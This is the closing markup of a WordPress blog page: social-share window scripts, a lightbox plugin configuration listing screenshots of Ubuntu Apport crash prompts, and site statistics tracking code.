				if ( 'undefined' !== typeof windowOpen ) {
					windowOpen.close();
				}
				windowOpen = window.open( jQuery( this ).attr( 'href' ), 'wpcomtwitter', 'menubar=1,resizable=1,width=600,height=350' );
				return false;
			});
var windowOpen;
			jQuery( document.body ).on( 'click', 'a.share-google-plus-1', function() {
				// If there's another sharing window open, close it.
				if ( 'undefined' !== typeof windowOpen ) {
					windowOpen.close();
				}
				windowOpen = window.open( jQuery( this ).attr( 'href' ), 'wpcomgoogle-plus-1', 'menubar=1,resizable=1,width=480,height=550' );
				return false;
			});
var windowOpen;
			jQuery( document.body ).on( 'click', 'a.share-linkedin', function() {
				// If there's another sharing window open, close it.
				if ( 'undefined' !== typeof windowOpen ) {
					windowOpen.close();
				}
				windowOpen = window.open( jQuery( this ).attr( 'href' ), 'wpcomlinkedin', 'menubar=1,resizable=1,width=580,height=450' );
				return false;
			});
</script>
<script type="text/javascript" id="slb_footer">/* <![CDATA[ */if ( !!window.jQuery ) {(function($){$(document).ready(function(){if ( !!window.SLB && SLB.has_child('View.init') ) { SLB.View.init({"ui_autofit":true,"ui_animate":true,"slideshow_autostart":false,"slideshow_duration":"6","group_loop":true,"ui_overlay_opacity":"0.8","ui_title_default":false,"theme_default":"slb_default","ui_labels":{"loading":"Loading","close":"Close","nav_next":"Next","nav_prev":"Previous","slideshow_start":"Start slideshow","slideshow_stop":"Stop slideshow","group_status":"Item %current% of %total%"}}); }
if ( !!window.SLB && SLB.has_child('View.assets') ) { {$.extend(SLB.View.assets, {"2029817036":{"id":139,"type":"image","source":"https:\/\/donncha.is\/wp-content\/uploads\/2016\/12\/apport-file-handler.png","internal":true,"sizes":{"thumbnail":{"file":"apport-file-handler-150x150.png","width":150,"height":150,"mime-type":"image\/png"},"medium":{"file":"apport-file-handler-300x162.png","width":300,"height":162,"mime-type":"image\/png"},"large":{"file":"apport-file-handler-1024x555.png","width":1024,"height":555,"mime-type":"image\/png"},"post-thumbnail":{"file":"apport-file-handler-624x338.png","width":624,"height":338,"mime-type":"image\/png"},"original":{"file":"2016\/12\/apport-file-handler.png","width":1856,"height":1006}},"image_meta":{"aperture":0,"credit":"","camera":"","caption":"","created_timestamp":0,"copyright":"","focal_length":0,"iso":0,"shutter_speed":0,"title":"","orientation":0},"description":"","title":"Crash file opened automatically by apport-gtk","caption":""},"832215359":{"id":140,"type":"image","source":"https:\/\/donncha.is\/wp-content\/uploads\/2016\/12\/basic-apport-prompt.png","internal":true,"sizes":{"thumbnail":{"file":"basic-apport-prompt-150x150.png","width":150,"height":150,"mime-type":"image\/png"},"medium":{"file":"basic-apport-prompt-300x118.png","width":300,"height":118,"mime-type":"image\/png"},"post-thumbnail":{"file":"basic-apport-prompt-624x246.png","width":624,"height":246,"mime-type":"image\/png"},"original":{"file":"2016\/12\/basic-apport-prompt.png","width":726,"height":287}},"image_meta":{"aperture":0,"credit":"","camera":"","caption":"","created_timestamp":0,"copyright":"","focal_length":0,"iso":0,"shutter_speed":0,"title":"","orientation":0},"description":"","title":"Typical Apport prompt","caption":""},"1083263339":{"id":141,"type":"image","source":"https:\/\/donncha.is\/wp-content\/uploads\/2016\/12\/apport-privilaged-prompt.png","internal":true,"sizes":{"thumbnail":{"file":"apport-privilaged-prompt-150x150.png","width":150,"height":150,"mime-type":"image\/png"},"medium":{"file":"apport-privilaged-prompt-300x161.png","width":300,"height":161,"mime-type":"image\/png"},"post-thumbnail":{"file":"apport-privilaged-prompt-624x335.png","width":624,"height":335,"mime-type":"image\/png"},"original":{"file":"2016\/12\/apport-privilaged-prompt.png","width":679,"height":365}},"image_meta":{"aperture":0,"credit":"","camera":"","caption":"","created_timestamp":0,"copyright":"","focal_length":0,"iso":0,"shutter_speed":0,"title":"","orientation":0},"description":"","title":"Apport system application crash prompt","caption":""}});} }
/* THM */
if ( !!window.SLB && SLB.has_child('View.extend_theme') ) { SLB.View.extend_theme('slb_baseline',{"name":"Baseline","parent":"","styles":[{"handle":"base","uri":"https:\/\/donncha.is\/wp-content\/plugins\/simple-lightbox\/themes\/baseline\/css\/style.css","deps":[]}],"layout_raw":"<div class=\"slb_container\"><div class=\"slb_content\">{{item.content}}<div class=\"slb_nav\"><span class=\"slb_prev\">{{ui.nav_prev}}<\/span><span class=\"slb_next\">{{ui.nav_next}}<\/span><\/div><div class=\"slb_controls\"><span class=\"slb_close\">{{ui.close}}<\/span><span class=\"slb_slideshow\">{{ui.slideshow_control}}<\/span><\/div><div class=\"slb_loading\">{{ui.loading}}<\/div><\/div><div class=\"slb_details\"><div class=\"inner\"><div class=\"slb_data\"><div class=\"slb_data_content\"><span class=\"slb_data_title\">{{item.title}}<\/span><span class=\"slb_group_status\">{{ui.group_status}}<\/span><div class=\"slb_data_desc\">{{item.description}}<\/div><\/div><\/div><div class=\"slb_nav\"><span class=\"slb_prev\">{{ui.nav_prev}}<\/span><span class=\"slb_next\">{{ui.nav_next}}<\/span><\/div><\/div><\/div><\/div>"}); }if ( !!window.SLB && SLB.has_child('View.extend_theme') ) { SLB.View.extend_theme('slb_default',{"name":"Default (Light)","parent":"slb_baseline","styles":[{"handle":"font","uri":"https:\/\/fonts.googleapis.com\/css?family=Yanone+Kaffeesatz","deps":[]},{"handle":"base","uri":"https:\/\/donncha.is\/wp-content\/plugins\/simple-lightbox\/themes\/default\/css\/style.css","deps":[]}]}); }})})(jQuery);}/* ]]> */</script>
<script type="text/javascript" id="slb_context">/* <![CDATA[ */if ( !!window.jQuery ) {(function($){$(document).ready(function(){if ( !!window.SLB ) { {$.extend(SLB, {"context":["public","user_guest"]});} }})})(jQuery);}/* ]]> */</script>
<script type='text/javascript' src='https://stats.wp.com/e-202143.js' async defer></script>
<script type='text/javascript'>
	_stq = window._stq || [];
	_stq.push([ 'view', {v:'ext',j:'1:5.5.3',blog:'52234885',post:'138',tz:'0',srv:'donncha.is'} ]);
	_stq.push([ 'clickTrackerInit', '52234885', '138' ]);
</script>
</body>
</html>
